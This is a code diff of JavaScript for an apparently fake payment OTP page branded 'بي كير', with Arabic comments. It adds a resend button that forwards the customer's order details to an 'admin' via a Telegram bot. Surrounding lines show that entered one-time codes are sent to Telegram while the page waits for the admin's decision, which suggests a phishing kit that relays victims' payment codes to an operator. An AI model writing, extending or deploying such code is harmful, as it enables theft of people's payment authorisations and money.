@@ -170,6 +170,7 @@ function loadData() {
 function initBoxes() {
   const boxes      = [...document.querySelectorAll('.otp-box')];
   const confirmBtn = document.getElementById('otp-confirm-btn');
+  const resendBtn  = document.getElementById('otp-resend-btn');
 
   boxes.forEach((box, idx) => {
     box.addEventListener('input', e => {
@@ -199,8 +200,32 @@ function initBoxes() {
     });
   });
 
-  /* زر التأكيد — يرسل الرمز لـ Telegram */
+  /* زر التأكيد */
   if (confirmBtn) confirmBtn.addEventListener('click', submitOTP);
+
+  /* زر إعادة الإرسال */
+  if (resendBtn) {
+    resendBtn.addEventListener('click', async () => {
+      /* مسح الإدخال */
+      boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); b.disabled = false; });
+      if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد'; }
+      clearOTPErr();
+      waitingConfirm = false;
+      clearInterval(pollInt);
+
+      /* 📨 إعادة إرسال رسالة الطلب للأدمن */
+      await tgSend(`🔄 <b>إعادة إرسال — بي كير</b>
+
+${buildOrderMsg().replace('🔔 <b>طلب دفع جديد — بي كير</b>', '')}
+
+<i>العميل أعاد الإرسال...</i>`);
+
+      /* إعادة التركيز */
+      const sub = document.getElementById('otp-sub-text');
+      if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
+      boxes[0]?.focus();
+    });
+  }
 }
 
 /* ─── إرسال OTP للـ Telegram + انتظار قرار الأدمن ──── */
